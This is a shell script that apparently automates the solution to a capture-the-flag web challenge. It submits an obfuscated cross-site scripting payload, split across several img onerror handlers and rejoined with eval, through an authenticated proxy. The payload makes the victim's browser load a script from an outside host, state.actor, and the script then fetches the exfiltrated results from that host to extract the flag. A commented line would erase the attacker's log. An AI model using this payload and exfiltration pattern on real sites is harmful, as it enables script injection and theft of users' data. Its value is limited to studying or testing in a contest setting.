#!/bin/sh

# Update PAYLOAD with referrer IP from admin_up check. If length changes, change query as well
#PAYLOAD=$(cat <<'EOF'
#http://172.17.0.2:5000/ooops/d35fs23hu73ds/blocked.html?=<img src=a onerror=a='z=document.createElement'>_______<img src=a onerror=b='(\'script\');z.src=\'//state'>___<img src=a onerror=c='.actor/xxx.js\';document.body'>__<img src=a onerror=d='.appendChild(z);'>_________________<img src=aa onerror=eval(a+b+c+d)>_______________________
#EOF
#)
PAYLOAD=$(cat <<'EOF'
http://10.0.1.3:5000/ooops/d35fs23hu73ds/blocked.html?abc=<img src=a onerror=a='z=document.createElement'>_______<img src=a onerror=b='(\'script\');z.src=\'//state'>___<img src=a onerror=c='.actor/xxx.js\';document.body'>__<img src=a onerror=d='.appendChild(z);'>_________________<img src=aa onerror=eval(a+b+c+d)>_______________________
EOF
)

echo "Building malicious request through proxy"

PROXY_HOST="35.236.48.134"
http_proxy=http://OnlyOne:Overflow@${PROXY_HOST}:8080/ curl -s 'http://example.com/ooops/d35fs23hu73ds/reviewed.html' \
  -H 'Content-Type: application/x-www-form-urlencoded' -H 'Proxy-Authorization: Basic T25seU9uZTpPdmVyZmxvdw==' \
  -H 'Connection: keep-alive' \
  --data-urlencode "captcha_id=EFYGP.png" \
  --data-urlencode "captcha_guess=fasanotesting" \
  --data-urlencode "url=${PAYLOAD}" | grep -q "Thank you for your request"

STAGE1=$?
if [ $STAGE1 -ne 0 ]; then
  echo "Got unexpected response when submitting request"
  exit $STAGE1
fi


REMOTE="http://state.actor/ooops_test_suite.txt"
echo "Sent exploit to exfil to $REMOTE. Waiting 10s before checking for flag..."
sleep 10;

echo "DEBUG: results"
curl -s $REMOTE
exit 

OUTPUT=$(curl -s $REMOTE | grep -oh 'OOO{[a-zA-Z0-9_-]*}')
STAGE2=$?

# Get logging url to erase log
#curl -s http://state.actor/ooops_log.php?clear  >/dev/null

# Echo output (should contain flag)
echo $OUTPUT
exit $STAGE2

